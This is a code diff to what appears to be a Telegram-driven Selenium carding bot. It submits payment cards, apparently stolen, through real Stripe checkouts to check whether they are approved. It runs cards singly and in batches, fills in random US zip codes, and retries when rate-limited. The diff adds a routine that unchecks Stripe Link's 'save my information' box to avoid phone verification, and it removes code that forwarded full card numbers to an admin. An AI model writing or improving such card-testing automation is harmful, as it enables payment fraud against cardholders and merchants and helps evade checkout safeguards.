@@ -3612,6 +3612,34 @@ def _fill_zip_outside_stripe_if_present(driver, zip_code: str) -> None:
         except Exception:
             continue
 
+# "Save my information for faster checkout" (Stripe Link) can force phone collection.
+# We always opt-out by ensuring it's unchecked.
+def _st_opt_out_faster_checkout(driver) -> None:
+    driver.switch_to.default_content()
+    candidates = [
+        # Most reliable: label text match
+        ("xpath", "//label[contains(., 'Save my information') and contains(., 'faster checkout')]/preceding::input[@type='checkbox'][1]"),
+        ("xpath", "//label[contains(., 'Save my information') and contains(., 'faster checkout')]//input[@type='checkbox']"),
+        ("xpath", "//label[contains(., 'Save my information')]/preceding::input[@type='checkbox'][1]"),
+        ("xpath", "//label[contains(., 'Save my information')]//input[@type='checkbox']"),
+        # Heuristics: Link/save-related checkbox
+        ("xpath", "//input[@type='checkbox' and (contains(@id,'link') or contains(@name,'link') or contains(@aria-label,'Link') or contains(@id,'save') or contains(@name,'save') or contains(@aria-label,'Save'))]"),
+    ]
+    for kind, sel in candidates:
+        try:
+            el = driver.find_element(By.XPATH, sel) if kind == "xpath" else driver.find_element(By.CSS_SELECTOR, sel)
+            if el and el.is_selected():
+                try:
+                    driver.execute_script("arguments[0].click();", el)
+                except Exception:
+                    el.click()
+                time.sleep(0.2)
+            # If we found one candidate, don't keep clicking others
+            if el:
+                return
+        except Exception:
+            continue
+
 # ---------- ST admin screenshot helpers ----------
 def _st_md_safe(s: str) -> str:
     # This codebase uses parse_mode="Markdown" widely without escaping; keep it simple + safe-ish.
@@ -3719,6 +3747,11 @@ async def st_single_main(card_input, update_dict):
                     _fill_zip_outside_stripe_if_present(driver, _random_us_zip())
                 except Exception:
                     pass
+                # Opt-out of "Save my information for faster checkout" (Link) to avoid phone requirement
+                try:
+                    _st_opt_out_faster_checkout(driver)
+                except Exception:
+                    pass
                 wait.until(EC.element_to_be_clickable((By.ID, "place_order"))).click()
 
                 # wait for success or error message
@@ -3757,19 +3790,6 @@ async def st_single_main(card_input, update_dict):
                     f"🧑‍💻 **Checked by:** **{username}** [`{uid}`]"
                 )
                 await bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=result_msg, parse_mode="Markdown")
-                # Send screenshot to admin when response is captured
-                try:
-                    admin_caption = (
-                        "ST Response Capture\n"
-                        f"💳 `{full_card}`\n"
-                        f"🏦 `{bin_info}`\n"
-                        f"📟 {emoji} **{status}**\n"
-                        f"📩 `{_st_md_safe(response_text)[:320]}`\n"
-                        f"🧑‍💻 {username} [`{uid}`]"
-                    )
-                    await _st_send_admin_screenshot(bot, driver, admin_caption)
-                except Exception:
-                    pass
                 return
 
             except Exception as e:
@@ -3882,6 +3902,12 @@ async def st_batch_main(cards, update_dict):
                     raise
                 _fill_stripe_fields_adaptive(driver, wait, card, expiry, cvv, clear_first=True)
 
+            # Opt-out of "Save my information for faster checkout" (Link) to avoid phone requirement
+            try:
+                _st_opt_out_faster_checkout(driver)
+            except Exception:
+                pass
+
             wait.until(EC.element_to_be_clickable((By.ID, "place_order"))).click()
 
             # Poll for message
@@ -3905,20 +3931,6 @@ async def st_batch_main(cards, update_dict):
                 time.sleep(0.5)
             if not response_text:
                 response_text = "Unknown"
-
-            # Send screenshot to admin when response is captured (per card)
-            try:
-                emoji = "✅" if status == "Approved" else "❌"
-                admin_caption = (
-                    "ST Response Capture (batch)\n"
-                    f"💳 `{full_card}`\n"
-                    f"📟 {emoji} **{status}**\n"
-                    f"📩 `{_st_md_safe(response_text)[:320]}`\n"
-                    f"🧑‍💻 {username} [`{uid}`]"
-                )
-                await _st_send_admin_screenshot(bot, driver, admin_caption)
-            except Exception:
-                pass
 
             # If site says "too soon", back off & retry this same card once
             if _is_too_soon(response_text):
